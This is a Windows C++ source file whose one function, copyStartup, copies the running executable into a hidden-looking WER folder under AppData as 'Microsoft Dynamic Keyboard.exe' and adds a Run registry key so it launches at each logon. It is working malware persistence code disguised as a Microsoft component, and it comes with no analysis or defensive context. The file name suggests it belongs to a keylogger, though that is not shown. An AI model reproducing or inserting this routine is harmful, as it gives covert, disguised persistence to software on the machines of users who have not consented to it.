#include "stdafx.h"
#include "CopyStartup.h"


void copyStartup() {

	// name of running process
	char my_name[260];
	GetModuleFileName(GetModuleHandle(0), my_name, 260);
	string cuurent_file_path = my_name;

	if (cuurent_file_path.find("\\AppData\\Local\\Microsoft\\Windows\\WER") == std::string::npos) {
		
		string expexted_directory_path;
		char pa[260];
		GetEnvironmentVariable("USERPROFILE", pa, 260);
		expexted_directory_path = pa;
		expexted_directory_path += "\\AppData\\Local\\Microsoft\\Windows\\WER";

		string expexted_file_path = expexted_directory_path;
		expexted_file_path += "\\Microsoft Dynamic Keyboard.exe";

		CreateDirectory(expexted_directory_path.c_str(), NULL);
		CopyFile(cuurent_file_path.c_str(), expexted_file_path.c_str(), FALSE);

		HKEY key;
		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &key);
		RegSetValueEx(key, "Microsoft Dynamic Keyboard", 0, REG_SZ, (LPBYTE)expexted_file_path.c_str(), expexted_file_path.length() + 1);//add to autostars
	}

	//HICON hWindowIcon = NULL;
	//string stricon = "";

	//if (hWindowIcon != NULL)
	//	DestroyIcon(hWindowIcon);
	//hWindowIcon = LoadIcon(NULL, MAKEINTRESOURCE(IDI_ERROR));

	//if (hWindowIcon == NULL)
	//	printf("errors");
	//if (SendMessage(GetActiveWindow(), WM_SETICON, ICON_BIG, (LPARAM)hWindowIcon) != WM_SETICON)
	//	printf("errors");
	/*if (SendMessage(GetActiveWindow(), WM_SETICON, ICON_SMALL, (LPARAM)hWindowIcon) != WM_SETICON)
		printf("errors");*/

}



